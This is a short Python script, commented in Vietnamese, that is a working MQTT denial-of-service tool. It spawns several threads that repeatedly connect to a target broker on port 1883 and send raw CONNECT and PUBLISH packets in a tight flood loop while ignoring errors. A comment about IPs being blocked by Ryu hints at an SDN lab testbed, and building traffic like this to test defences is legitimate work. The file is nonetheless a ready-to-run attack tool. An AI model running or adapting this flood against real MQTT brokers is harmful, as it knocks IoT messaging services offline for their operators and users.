#!/usr/bin/env python3
import argparse
import time
import socket
import threading

def mqtt_flood(target_ip, target_port, rate, thread_id):
    # Tạo một gói tin MQTT Connect giả lập đơn giản (Raw bytes)
    connect_pkt = b'\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x04test'
    # Gói tin Publish (QoS 0)
    publish_pkt = b'\x30\x12\x00\x0atest/topicspam1234'
    
    delay = 1.0 / rate if rate > 0 else 0
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.send(connect_pkt)
            
            # Bắn liên tục các gói publish để gây lụt
            for _ in range(50):
                s.send(publish_pkt)
                if delay > 0:
                    time.sleep(delay)
            s.close()
        except Exception:
            # Bỏ qua lỗi kết nối (nếu broker bị sập hoặc IP bị Ryu chặn)
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT DoS/Flood Attacker")
    parser.add_argument("--target", required=True, help="IP của MQTT Broker")
    parser.add_argument("--rate", type=int, default=1000, help="Số gói tin / giây trên mỗi luồng")
    parser.add_argument("--threads", type=int, default=5, help="Số lượng luồng tấn công")
    args = parser.parse_args()

    print(f"[*] Đang khởi chạy DoS Flood tới {args.target}:1883 với {args.threads} threads...")
    for i in range(args.threads):
        t = threading.Thread(target=mqtt_flood, args=(args.target, 1883, args.rate, i))
        t.daemon = True
        t.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Dừng tấn công.")